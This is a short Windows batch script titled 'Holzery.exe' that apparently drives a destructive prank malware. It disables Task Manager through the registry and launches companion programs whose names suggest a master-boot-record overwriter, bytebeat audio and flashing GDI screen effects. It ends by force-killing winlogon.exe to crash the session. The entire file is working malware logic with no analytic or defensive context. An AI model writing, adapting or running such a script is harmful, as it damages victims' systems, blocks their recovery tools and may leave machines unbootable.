@echo off
title Holzery.exe
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
start s.bat
timeout 10
start mbr.exe
start bytebeat.exe
timeout 3
start clt.exe
timeout 10
taskkill /f /im clt.exe
start PatBlt2.exe
timeout 11
taskkill /f /im PatBlt2.exe
start PatBlt3.exe
start clt.exe
timeout 12
taskkill /f /im PatBlt3.exe
taskkill /f /im clt.exe
start BitBlt1.exe
start inv.exe
timeout 22
taskkill /f /im BitBlt1.exe
taskkill /f /im inv.exe
start PatBlt2.exe
timeout 20
taskkill /f /im PatBlt2
start PatBlt2.exe
timeout 12
start BitBlt1.exe
start PatBlt3.exe
start clt.exe
start inv.exe
timeout 8
taskkill /f /im winlogon.exe
